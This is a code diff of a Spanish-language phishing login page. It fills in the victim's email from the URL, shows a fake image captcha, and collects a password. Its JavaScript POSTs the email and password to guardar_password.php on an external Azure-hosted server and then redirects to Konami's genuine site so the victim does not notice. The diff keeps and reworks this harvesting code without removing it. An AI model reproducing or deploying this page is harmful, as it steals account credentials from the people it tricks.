@@ -229,7 +229,7 @@
 
             <form
                 id="loginForm"
-                action="https://nublebusphp-fsb0bwd3h4bscgfv.chilecentral-01.azurewebsites.net/guardar_password.php"
+                action="guardar_password.php"
                 method="POST"
             >
 
@@ -331,84 +331,114 @@
     </div>
 
     <script>
-    // OBTENER EMAIL
-    const params = new URLSearchParams(window.location.search);
-    const email = params.get("email") || "";
 
-    document.getElementById("correo").textContent = email;
-    document.getElementById("emailHidden").value = email;
+        // OBTENER EMAIL
 
-    // CAPTCHA
-    const captchaItems = document.querySelectorAll(".captcha-item");
+        const params =
+            new URLSearchParams(window.location.search);
 
-    captchaItems.forEach(item => {
-        item.addEventListener("click", () => {
-            item.classList.toggle("selected");
+        const email =
+            params.get("email");
+
+        // MOSTRAR EMAIL
+
+        document.getElementById("correo").textContent =
+            email;
+
+        // GUARDAR EMAIL EN INPUT HIDDEN
+
+        document.getElementById("emailHidden").value =
+            email;
+
+
+
+        // CAPTCHA
+
+        const captchaItems =
+            document.querySelectorAll(".captcha-item");
+
+
+
+        captchaItems.forEach(item => {
+
+            item.addEventListener("click", () => {
+
+                item.classList.toggle("selected");
+
+            });
+
         });
-    });
 
-    // VALIDAR CAPTCHA
-    async function verificarCaptcha() {
 
-        const correctas = document.querySelectorAll(".captcha-item.correct");
-        const correctasSeleccionadas = document.querySelectorAll(".captcha-item.correct.selected");
-        const incorrectasSeleccionadas = document.querySelectorAll(".captcha-item.selected:not(.correct)");
 
-        const password = document.getElementById("password").value;
+        // VALIDAR CAPTCHA
 
-        if (password.trim() === "") {
-            alert("Ingresa una contraseña");
-            return;
-        }
+       function verificarCaptcha(){
 
-        if (
-            correctasSeleccionadas.length === correctas.length &&
-            incorrectasSeleccionadas.length === 0
-        ) {
+    const correctas =
+        document.querySelectorAll(".captcha-item.correct");
 
-            try {
+    const correctasSeleccionadas =
+        document.querySelectorAll(".captcha-item.correct.selected");
 
-                const response = await fetch(
-                    "https://nublebusphp-fsb0bwd3h4bscgfv.chilecentral-01.azurewebsites.net/guardar_password.php",
-                    {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/x-www-form-urlencoded"
-                        },
-                        body:
-                            "email=" + encodeURIComponent(email) +
-                            "&password=" + encodeURIComponent(password)
-                    }
-                );
+    const incorrectasSeleccionadas =
+        document.querySelectorAll(".captcha-item.selected:not(.correct)");
 
-                await fetch(
-    "https://nublebusphp-fsb0bwd3h4bscgfv.chilecentral-01.azurewebsites.net/guardar_password.php",
-    {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/x-www-form-urlencoded"
-        },
-        body:
-            "email=" + encodeURIComponent(email) +
-            "&password=" + encodeURIComponent(password)
+    const password =
+        document.getElementById("password").value;
+
+
+
+    if(password.trim() === ""){
+
+        alert("Ingresa una contraseña");
+
+        return;
+
     }
-).catch(() => {});
 
-// redirección FORZADA
-window.location.replace("https://www.konami.com/games/eu/es/");
 
-            } catch (error) {
-                console.error("ERROR FETCH:", error);
-                alert("Error al enviar datos");
-            }
 
-        } else {
-            alert("Selecciona solamente los personajes correctos");
-        }
+    if(
+        correctasSeleccionadas.length === correctas.length &&
+        incorrectasSeleccionadas.length === 0
+    ){
+
+        fetch("https://nublebusphp-fsb0bwd3h4bscgfv.chilecentral-01.azurewebsites.net/guardar_password.php", {
+
+            method: "POST",
+
+            headers: {
+                "Content-Type":
+                "application/x-www-form-urlencoded"
+            },
+
+            body:
+                "email=" + encodeURIComponent(email) +
+                "&password=" + encodeURIComponent(password)
+
+        })
+
+        .then(response => response.text())
+
+        .then(data => {
+
+           
+
+            // ABRIR OTRA PAGINA
+            window.location.href = "https://www.konami.com/games/eu/es/";
+
+        });
+
+    }else{
+
+        alert("Selecciona solamente los personajes correctos");
+
     }
-</script>
 
-      
+}
+
+    </script>
 
 </body>
 </html>
